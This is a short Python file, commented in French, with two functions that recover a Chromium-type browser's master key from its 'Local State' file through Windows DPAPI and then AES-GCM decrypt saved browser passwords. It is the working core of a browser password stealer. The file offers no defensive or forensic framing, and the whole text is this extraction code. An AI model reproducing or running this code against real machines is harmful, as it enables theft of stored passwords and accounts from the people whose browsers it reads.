import base64
import json
import os

from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


# Fonction pour extraire la clé de chiffrement des navigateurs
def get_master_key(path: str):
    if not os.path.exists(path + "\\Local State"):
        return None
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    unencrypted_key = CryptUnprotectData(key, None, None, None, 0)[1]
    return unencrypted_key


# Fonction pour déchiffrer les mots de passe
def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(f"Failed to decrypt: {e}")
        return ""
